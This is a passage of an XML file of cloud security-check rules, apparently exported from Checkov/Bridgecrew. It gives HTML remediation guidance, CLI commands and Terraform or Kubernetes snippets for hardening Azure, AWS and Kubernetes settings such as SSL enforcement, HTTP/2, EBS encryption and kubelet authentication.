      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-storage-for-critical-data-are-encrypted-with-customer-managed-key' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_18</key>
    <name>Ensure Web App uses the latest version of HTTP</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="web-app-does-not-use-the-latest-version-of-http"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-web-app-does-not-use-the-latest-version-of-http"></div>Web App does not use the latest version of HTTP </div><a aria-label="Skip link to Web App does not use the latest version of HTTP " class="heading-anchor-icon fa fa-anchor" href="#web-app-does-not-use-the-latest-version-of-http"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Periodically, new versions of HTTP are released to address security flaws and include additional functionality. HTTP 2.0 has additional performance improvements on the head-of-line blocking problem of the older HTTP version, header compression, and prioritization of requests. HTTP 2.0 no longer supports HTTP 1.1's chunked transfer encoding mechanism, as it provides its own more efficient mechanisms for data streaming.</p>
<p>We recommend you use the latest HTTP version for web apps and take advantage of any security fixes and new functionalities featured. With each software installation you can determine if a given update meets your organization's requirements. Organizations should verify the compatibility and support provided for any additional software, assessing the current version against the update revision being considered.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>App Services</strong>.</li>
<li>For each Web App, click<em> App</em>.<br/>
a) Navigate to <strong>Setting </strong>section.<br/>
b) Click <strong>Application Settings</strong>.<br/>
c)  Navigate to <strong>General Settings </strong>section.<br/>
d) Set <strong>HTTP version</strong> to <strong>2.0</strong>.</li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>Most modern browsers support the HTTP 2.0 protocol over TLS only, with non-encrypted traffic using HTTP 1.1. To ensure that client browsers connect to your app with HTTP/2, either by an App Service Certificate for your app's custom domain or by binding a third party certificate.</p></blockquote>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set HTTP 2.0 version for an existing app, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az webapp config set 
--resource-group &lt;RESOURCE_GROUP_NAME&gt; 
--name &lt;APP_NAME&gt;
--http20-enabled true
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_app_service</li>
<li><strong>Argument</strong>: http2_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
    ...

+    site_config {
+        http2_enabled = true
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_8' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_2</key>
    <name>Ensure only encrypted EBS volumes are attached to EC2 instances</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="not-only-encrypted-ebs-volumes-are-attached-to-ec2-instances"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-not-only-encrypted-ebs-volumes-are-attached-to-ec-2-instances"></div>Not only encrypted EBS volumes are attached to EC2 instances</div><a aria-label="Skip link to Not only encrypted EBS volumes are attached to EC2 instances" class="heading-anchor-icon fa fa-anchor" href="#not-only-encrypted-ebs-volumes-are-attached-to-ec2-instances"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_volume_attachment, aws_instance, aws_ebs_volume</li>
<li><strong>Argument:</strong> <em>volume_id</em> and <em>instance_id</em> of aws_volume_attachment</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_instance" "web" {
  ami               = "ami-21f78e11"
  availability_zone = "us-west-2a"
  instance_type     = "t2.micro"

  tags = {
    Name = "HelloWorld"
  }
}

resource "aws_volume_attachment" "ok_attachment1" {
  device_name = "/dev/sdh3"
  volume_id   = aws_ebs_volume.ok_ebs2.id
  instance_id = aws_instance.web.id
}


resource "aws_ebs_volume" "ok_ebs2" {
  availability_zone = ""
  encrypted = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-only-encrypted-ebs-volumes-are-attached-to-ec2-instances' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-only-encrypted-ebs-volumes-are-attached-to-ec2-instances</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-only-encrypted-ebs-volumes-are-attached-to-ec2-instances' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_28</key>
    <name>Ensure MySQL server databases have Enforce SSL connection enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mysql-server-databases-do-not-have-enforce-ssl-connection-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-my-sql-server-databases-do-not-have-enforce-ssl-connection-enabled"></div>MySQL server databases do not have Enforce SSL connection enabled </div><a aria-label="Skip link to MySQL server databases do not have Enforce SSL connection enabled " class="heading-anchor-icon fa fa-anchor" href="#mysql-server-databases-do-not-have-enforce-ssl-connection-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>SSL connectivity provides a new layer of security by connecting a database server to client applications using Secure Sockets Layer (SSL). Enforcing SSL connections between a database server and client applications helps protect against <em>man-in-the-middle</em> attacks. This is achieved by encrypting the data stream between the server and application.</p>
<p>We recommend you set <strong>Enforce SSL connection</strong> to <strong>Enable</strong> on MYSQL Server databases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Azure Database</strong> for <strong>MySQL server</strong>.</li>
<li>For each database:<br/>
a) Click <strong>Connection security</strong>.<br/>
b) Navigate to <strong>SSL Settings </strong>section.<br/>
c) To <strong>Enforce SSL connection</strong> click <strong>ENABLED</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set MYSQL Databases to Enforce SSL connection, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az mysql server update 
--resource-group &lt;resourceGroupName&gt; 
--name &lt;serverName&gt; 
--ssl-enforcement Enabled
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_mysql_server</li>
<li><strong>Argument</strong>: ssl_enforcement_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mysql_server" "example" {
    ...
 +  ssl_enforcement_enabled             = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_9' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_9</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_9' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_29</key>
    <name>Ensure Azure PostgreSQL database server with SSL connection is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-postgresql-database-server-with-ssl-connection-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-postgre-sql-database-server-with-ssl-connection-is-disabled"></div>Azure PostgreSQL database server with SSL connection is disabled</div><a aria-label="Skip link to Azure PostgreSQL database server with SSL connection is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-postgresql-database-server-with-ssl-connection-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>SSL connectivity</strong> provides a new layer of security by connecting a database server to client applications using a Secure Sockets Layer (SSL). Enforcing SSL connections between a database server and client applications helps protect against <em>man-in-the-middle</em> attacks. This is achieved by encrypting the data stream between the server and application.</p>
<p>We recommend you set <strong>Enforce SSL connection</strong> to<strong> Enable</strong> on PostgreSQL Server databases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Azure Database</strong> for <strong>PostgreSQL server</strong>.</li>
<li>For each database:<br/>
a) Click <strong>Connection security</strong>.<br/>
b) Navigate to <strong>SSL Settings </strong>section.<br/>
c) To <strong>Enforce SSL connection</strong> click <strong>ENABLED</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set <strong>Enforce SSL Connection</strong> for  a<strong>PostgreSQL Database</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az postgres server update 
--resource-group &lt;resourceGroupName&gt; 
--name &lt;serverName&gt;
--ssl-enforcement Enabled
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_postgresql_server</li>
<li><strong>Argument</strong>: ssl_enforcement_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_postgresql_server" "example" {
    ...
 +  ssl_enforcement_enabled             = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_10' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_72</key>
    <name>Ensure the --kubelet-client-certificate and --kubelet-client-key arguments are set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---kubelet-client-certificate-and---kubelet-client-key-arguments-are-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-kubelet-client-certificate-and-kubelet-client-key-arguments-are-not-set-appropriately"></div>The --kubelet-client-certificate and --kubelet-client-key arguments are not set appropriately</div><a aria-label="Skip link to The --kubelet-client-certificate and --kubelet-client-key arguments are not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---kubelet-client-certificate-and---kubelet-client-key-arguments-are-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable certificate based kubelet authentication. The apiserver, by default, does not authenticate itself to the kubelet's HTTPS endpoints. The requests from the apiserver are treated anonymously. You should set up certificate- based kubelet authentication to ensure that the apiserver authenticates itself to kubelets when submitting requests.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --kubelet-client-certificate=/path/to/cert
+   - --kubelet-client-key=/path/to/key
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-client-certificate-and-kubelet-client-key-arguments-are-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-client-certificate-and-kubelet-client-key-arguments-are-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-client-certificate-and-kubelet-client-key-arguments-are-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_85</key>
    <name>Ensure the admission control plugin NodeRestriction is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-admission-control-plugin-noderestriction-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-admission-control-plugin-node-restriction-is-not-set"></div>The admission control plugin NodeRestriction is not set</div><a aria-label="Skip link to The admission control plugin NodeRestriction is not set" class="heading-anchor-icon fa fa-anchor" href="#the-admission-control-plugin-noderestriction-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Limit the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Node</code> and <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Pod</code> objects that a kubelet could modify.<br/>
Using the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">NodeRestriction</code> plug-in ensures that the kubelet is restricted to the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Node</code> and <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Pod </code>objects that it could modify as defined. Such kubelets will only be allowed to modify their own <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Node</code> API object, and only modify <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Pod</code> API objects that are bound to their node.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --enable-admission-plugins=NodeRestriction
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-noderestriction-is-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-noderestriction-is-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-noderestriction-is-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_30</key>
    <name>Ensure Azure PostgreSQL database server with log checkpoints parameter is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-postgresql-database-server-with-log-checkpoints-parameter-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-postgre-sql-database-server-with-log-checkpoints-parameter-is-disabled"></div>Azure PostgreSQL database server with log checkpoints parameter is disabled</div><a aria-label="Skip link to Azure PostgreSQL database server with log checkpoints parameter is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-postgresql-database-server-with-log-checkpoints-parameter-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling <strong>log_checkpoints</strong> helps the PostgreSQL Database to log each checkpoint and generate query and error logs. Access to transaction logs is not supported. Query and error logs can be used to identify, troubleshoot, repair configuration errors, and address sub-optimal performance issues.</p>
<p>We recommend you set <strong>log_checkpoints</strong> to <strong>On</strong> for PostgreSQL Server Databases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to Azure Database for PostgreSQL server.</li>
<li>For each database:<br/>
a) Click <strong>Server</strong> parameters.<br/>
b) Navigate to <strong>log_checkpoints</strong>.<br/>
c) Click <strong>On</strong>.<br/>
d) Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To update the <strong>log_checkpoints</strong> configuration, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az postgres server configuration set 
--resource-group &lt;resourceGroupName&gt;
--server-name &lt;serverName&gt; 
--name log_checkpoints 
--value on
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_postgresql_configuration</li>
<li><strong>Argument</strong>: name + value</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">- resource "azurerm_postgresql_configuration" "example" {
-    name                = "log_checkpoints"
-    resource_group_name = data.azurerm_resource_group.example.name
-    server_name         = azurerm_postgresql_server.example.name
-    value               = "off"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_11' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_29</key>
    <name>Ensure public API gateway are protected by AWS Web Application Firewall v2 (AWS WAFv2)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="public-api-gateway-not-configured-with-aws-web-application-firewall-v2-aws-wafv2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-public-api-gateway-not-configured-with-aws-web-application-firewall-v-2-aws-wa-fv-2"></div>Public API gateway not configured with AWS Web Application Firewall v2 (AWS WAFv2)</div><a aria-label="Skip link to Public API gateway not configured with AWS Web Application Firewall v2 (AWS WAFv2)" class="heading-anchor-icon fa fa-anchor" href="#public-api-gateway-not-configured-with-aws-web-application-firewall-v2-aws-wafv2"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
